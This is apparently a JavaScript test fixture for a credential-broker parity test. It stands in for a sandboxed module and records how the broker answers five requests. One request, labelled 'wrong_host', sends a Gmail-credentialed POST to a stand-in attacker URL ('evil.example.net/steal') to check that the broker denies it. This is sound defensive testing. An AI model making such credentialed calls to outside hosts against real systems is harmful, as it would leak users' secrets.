// Stands in for areev-sandbox in the #201 parity test: a `wasm32-areev-io`
// module that makes five calls through the credential broker it was handed
// and reports each one as its result. The "module" it is given (`--module`)
// is a JSON file naming the upstream to call, so the same script serves the
// binding and the CLI with no environment to agree on — a sandboxed spawn
// gets no environment beyond `AREEV_*` anyway.
import { readFileSync } from 'node:fs'

const at = process.argv.indexOf('--module')
const { upstream } = JSON.parse(readFileSync(process.argv[at + 1], 'utf8'))
const broker = process.env.AREEV_EGRESS_URL
const token = process.env.AREEV_EGRESS_TOKEN

async function ask(req) {
  if (!broker) return { status: 0, body: 'no broker' }
  const r = await fetch(broker, {
    method: 'POST',
    headers: { 'X-Areev-Egress-Token': token, 'Content-Type': 'application/json' },
    body: JSON.stringify(req),
  })
  const text = await r.text()
  let body
  try { body = JSON.parse(text) } catch { body = text }
  return { status: r.status, body }
}

const out = {
  admitted: await ask({ url: upstream + '/ok', method: 'POST', credential: 'gmail', body: '{}' }),
  wrong_host: await ask({ url: 'https://evil.example.net/steal', method: 'POST', credential: 'gmail' }),
  wrong_method: await ask({ url: upstream + '/ok', method: 'GET', credential: 'gmail' }),
  undeclared_credential: await ask({ url: upstream + '/ok', method: 'POST', credential: 'other' }),
  unpaired: await ask({ url: upstream + '/ok', method: 'POST', credential: 'sheets' }),
  // The secret itself must never be in here.
  leak: process.env.AREEV_TEST_GMAIL_201 ?? '',
  allow_fetch: process.argv.includes('--allow-fetch'),
}
process.stdout.write(JSON.stringify(out))
